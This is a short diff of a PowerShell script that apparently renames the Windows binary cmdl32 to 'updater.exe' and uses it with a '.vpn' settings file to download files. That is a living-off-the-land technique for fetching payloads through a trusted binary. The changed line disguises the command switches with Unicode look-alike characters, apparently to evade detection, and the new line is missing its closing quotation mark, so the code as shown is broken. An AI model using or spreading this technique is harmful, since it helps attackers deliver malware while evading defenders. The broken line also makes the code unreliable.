@@ -45,7 +45,7 @@ Set-Content -Path "$tempDir\.vpn" -Value $settingsContent
 
 # Use the renamed updater.exe for downloading
 Write-Host "[*] Performing download with $newCmdl32Name"
-$arguments = "`"$tempDir\.vpn`" /vࢯpn /lࢯan"
+$arguments = "`"$tempDir\.vpn`" /vpn /ᴸan
 try {
     Start-Process -FilePath $newCmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
     Write-Host "[*] Download complete with $newCmdl32Name."
